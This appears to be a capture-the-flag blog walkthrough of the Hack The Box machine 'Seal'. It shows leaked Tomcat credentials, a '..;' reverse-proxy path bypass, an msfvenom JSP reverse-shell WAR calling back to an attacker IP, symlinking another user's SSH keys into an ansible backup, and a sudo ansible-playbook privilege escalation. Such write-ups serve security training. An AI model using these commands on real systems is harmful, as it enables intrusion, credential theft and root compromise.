---
title: HTB 🦭  Seal
date: 2022-02-1
layout: single
header:
  teaser: assets/images/htb/seal/teaser.png
excerpt: No seals were harmed in the rooting of this box. Seal is a box concerning reverse proxies, tomcat, and ansible. An nginx instance using tomcat as a reverse proxy hosts a Gitbucket which we are able to log into after making an account. After some searching plaintext credentials are discovered for the tomcat manager page. After some research, the discovery is made that the web server is vulnerable to path mishandling allowing us to login. A war reverse shell gets us access as `tomcat` which can be upgraded through some clever cronjob manipulation involving linking files and backups. Finally, we use the newfound `luis` user account to run ansible as root without a password, leading to victory!
classes: wide
categories:
  - hackthebox
tags:
  - hackthebox
  - OSCP
  - web
  - nginx
  - tomcat
  - ansible
---

# Summary
<img src="/assets/images/htb/seal/seal.png" width="250" height="250"/>

No seals were harmed in the rooting of this box. Seal is a box concerning reverse proxies, tomcat, and ansible.

An nginx instance using tomcat as a reverse proxy hosts a Gitbucket which we are able to log into after making an account. After some searching plaintext credentials are discovered for the tomcat manager page. After some research, the discovery is made that the web server is vulnerable to path mishandling allowing us to login. A war reverse shell gets us access as `tomcat` which can be upgraded through some clever cronjob manipulation involving linking files and backups. Finally, we use the newfound `luis` user account to run ansible as root without a password, leading to victory!

# Nmap

Looks like a web server running a proxy on 8080
```
rustscan -a seal.htb --ulimit 5000

.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.10.250:22
Open 10.10.10.250:443
Open 10.10.10.250:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-01 20:36 EST
Initiating Ping Scan at 20:36
Scanning 10.10.10.250 [2 ports]
Completed Ping Scan at 20:36, 0.02s elapsed (1 total hosts)
Initiating Connect Scan at 20:36
Scanning seal.htb (10.10.10.250) [3 ports]
Discovered open port 443/tcp on 10.10.10.250
Discovered open port 8080/tcp on 10.10.10.250
Discovered open port 22/tcp on 10.10.10.250
Completed Connect Scan at 20:36, 0.01s elapsed (3 total ports)
Nmap scan report for seal.htb (10.10.10.250)
Host is up, received syn-ack (0.017s latency).
Scanned at 2022-02-01 20:36:53 EST for 0s

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack
443/tcp  open  https      syn-ack
8080/tcp open  http-proxy syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
```

# Web Enumeration

Start burp suite and pass feroxbuster through proxy
```
feroxbuster -u https://seal.htb/ --proxy http://127.0.0.1:8080 -k
...
302        0l        0w        0c https://seal.htb/css
302        0l        0w        0c https://seal.htb/images
302        0l        0w        0c https://seal.htb/js
302        0l        0w        0c https://seal.htb/admin
302        0l        0w        0c https://seal.htb/manager
302        0l        0w        0c https://seal.htb/icon
```
A few interesting requests are made after poking around

![](/assets/images/htb/seal/web1.png)

* Subdomain discovery returns nothing
  * `ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.10.250 "Host: FUZZ.seal.htb"`
* Nikto
  * tcp/443/nmap-http - Identified HTTP Server: nginx/1.18.0 (Ubuntu)
  * /manager/status: Default Tomcat Server Status interface found

Browsing to 8080 with https gives us an ssl error, make sure to connect on http
[https://10.10.10.250/manager/status](https://10.10.10.250/manager/status) gives us a login prompt

![](/assets/images/htb/seal/web2.png)

Sign up with a secure username and password, i.e.`asdf:asdf`

![](/assets/images/htb/seal/web3.png)

GitBucket with lots of source code. Browsing around reveals some projects

![](/assets/images/htb/seal/web4.png)

Lets pull the code and search for exposed credentials within the source
```
git clone http://seal.htb:8080/git/root/seal_market.git
git clone http://seal.htb:8080/git/root/infra.git

grep -r 'password'
grep -r 'admin'
```
Nothing jumps out sadly, after browsing more we find some active issues
![](/assets/images/htb/seal/web5.png)

Tomcat is having problems? That is of interest

![](/assets/images/htb/seal/web6.png)


After reading up on [how to set up tomcat with nginx as a reverse proxy](https://www.atlantic.net/vps-hosting/how-to-setup-tomcat-with-nginx-as-a-reverse-proxy-on-ubuntu-18-04) it made sense to view the source code they were using for it. Basically spells out that you will get a `403` on failed auth, and sent to `8000` (tomcat) if passed.
```
# URL: http://seal.htb:8080/root/seal_market/blob/master/nginx/sites-enabled/default
# NOTE: comments removed 
server {
	listen 443 ssl default_server;
	listen [::]:443 ssl default_server;
 
	root /var/www/html;
	ssl_protocols TLSv1.1 TLSv1.2;
	ssl_verify_client optional;
	
	# Add index.php to the list if you are using PHP
	index index.html index.htm index.nginx-debian.html;
 
	server_name _;
 
	location /manager/html {
		if ($ssl_client_verify != SUCCESS) {
			return 403;
		}
		proxy_set_header        Host $host;
		proxy_set_header        X-Real-IP $remote_addr;
		proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
		proxy_set_header        X-Forwarded-Proto $scheme;
		proxy_pass          http://localhost:8000;
		proxy_read_timeout  90;
		proxy_redirect      http://localhost:8000 https://0.0.0.0;
	}
 
	location /admin/dashboard {
		if ($ssl_client_verify != SUCCESS) {
			return 403;
		}
		proxy_set_header        Host $host;
		proxy_set_header        X-Real-IP $remote_addr;
		proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
		proxy_set_header        X-Forwarded-Proto $scheme;
		proxy_pass          http://localhost:8000;
		proxy_read_timeout  90;
		proxy_redirect      http://localhost:8000 https://0.0.0.0;
	}
 
        location /host-manager/html {
                if ($ssl_client_verify != SUCCESS) {
                        return 403;
                }
                proxy_set_header        Host $host;
                proxy_set_header        X-Real-IP $remote_addr;
                proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
                proxy_set_header        X-Forwarded-Proto $scheme;
                proxy_pass          http://localhost:8000;
                proxy_read_timeout  90;
                proxy_redirect      http://localhost:8000 https://0.0.0.0;
                # First attempt to serve request as file, then
                # as directory, then fall back to displaying a 404.
        }
 
	location / {
                proxy_set_header        Host $host;
                proxy_set_header        X-Real-IP $remote_addr;
                proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
                proxy_set_header        X-Forwarded-Proto $scheme;
                proxy_pass          http://localhost:8000;
                proxy_read_timeout  90;
                proxy_redirect      http://localhost:8000 https://0.0.0.0;
	}	
}
```

Commits give us a little more idea of whats been added, keep digging through old commits until we strike gold!

![](/assets/images/htb/seal/web8.png)

Creds! `tomcat:42MrHBf*z8{Z%` gives us access to the tomcat manager page.

![](/assets/images/htb/seal/web9.png)

## Tomcat

* Version
  * Apache Tomcat/9.0.31 (Ubuntu) 11.0.11+9-Ubuntu-0ubuntu2.20.04 Ubuntu Linux 5.4.0-80-generic amd64 seal 127.0.1.1
* Google for CVEs -- nothing promising
* Feroxbuster
  * Now hitting weird wildcards, which is a strong sign that [tomcat path traversal via reverse proxy mapping](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping) could be exploitable
  * Sure enough, we can hit [https://seal.htb/manager/status/..;/html](https://seal.htb/manager/status/..;/html)

Once we are in, take the war reverse shell onto the box!

> msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=10.10.14.2 LPORT=4445 -f war > shell.war

Remember to update requests to include the `..;`, i.e. [https://seal.htb/manager/html](https://seal.htb/manager/html) becomes [https://seal.htb/manager/status/..;/html](https://seal.htb/manager/status/..;/html)

> curl -X POST --upload-file shell.war -u 'tomcat:42MrHBf\*z8{Z%' "https://seal.htb/manager/status/..;/html/upload?org.apache.catalina.filters.CSRF\_NONCE=494B6B4F459CBAC9FF72075FC3391E29" -k

the response contains credentials in case we need them for later
```
<pre>
&lt;role rolename="manager-gui"/&gt;
&lt;user username="tomcat" password="s3cret" roles="manager-gui"/&gt;
</pre>
```
Here is the request sent to the server which spawns a shell

![](/assets/images/htb/seal/web10.png)

## Upgrading the Shell

To escape the limited shell we can use `script`
> SHELL=/bin/bash script -q /dev/null

After that, can grab `linpeas` off our box with simplehttp server and set it loose. Biggest thing that jumped out was a cronjob running ansible-playbook. 
```
root 1079 0.0 0.0 6812 2940 ? Ss Oct13 0:00 /usr/sbin/cron -f\
root 1084 0.0 0.0 8476 3432 ? S Oct13 0:00 \_ /usr/sbin/CRON -f\
luis 1096 0.0 0.0 2608 612 ? Ss Oct13 0:00 | \_ /bin/sh -c java -jar /home/luis/gitbucket.war\
luis 1101 0.2 4.5 3614468 185292 ? Sl Oct13 1:31 | \_ java -jar /home/luis/gitbucket.war\
root 135566 0.0 0.0 8352 3396 ? S 00:00 0:00 \_ /usr/sbin/CRON -f\
root 135569 0.0 0.0 2608 548 ? Ss 00:00 0:00 \_ /bin/sh -c sleep 30 && sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml
```

When investigating the playbook it was running, it looked to be a file copying mechanism which would create archives. This gave me ideas of finding creds within an archive file. The added field `copy_links=yes` is very interesting, as [anything linked with `ln` should also get copied](https://stackoverflow.com/questions/51351024/ansible-how-to-copy-files-from-a-linked-directory). Maby we can link sensitive files?
```yml
tomcat@seal:/opt/backups/playbook$ cat run.yml
cat run.yml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
```

### pspy

As expected, pspy picks up the cronjob we found earlier.
![](/assets/images/htb/seal/pspy.png)

Based off the ansible play running, we can try making fake files and soft linking (`ln -s`) them to ssh keys to then be copied over. I.e. `ln -s /home/luis/.ssh/ asdf.txt`. After some poking around to find a writable dir that would be copied, we create some links to this guy luis's ssh keys. nice.
```
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ls -al
ls -al
total 8
drwxrwxrwx 2 root   root   4096 Oct 14 00:46 .
drwxr-xr-x 7 root   root   4096 May  7 09:26 ..
lrwxrwxrwx 1 tomcat tomcat   23 Oct 14 00:45 asdf.txt -> /home/luis/.ssh/rsa.pub
lrwxrwxrwx 1 tomcat tomcat   19 Oct 14 00:46 pp.txt -> /home/luis/.ssh/rsa
-rw-r----- 1 tomcat tomcat    0 Oct 14 00:45 priv.txt
```
It works! `chmod 600 luis.key` to let us use the copied key followed by `ssh -i luis.key luis@seal.htb` for access to the user

## Luis -> Root

One of the first commands to run is `sudo -l`, which hits here for `ansible`
```
luis@seal:/tmp$ sudo -l Matching Defaults entries for luis on seal: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
User luis may run the following commands on seal: (ALL) NOPASSWD: /usr/bin/ansible-playbook *
```

run.yml is a play I wrote up to copy the root flag
```yml
- hosts: localhost
  tasks:
  - name: rooooot
    shell:
      "cp /root/root.txt /tmp/root.txt"
```
After running it, we have root!

![](/assets/images/htb/seal/win.png)

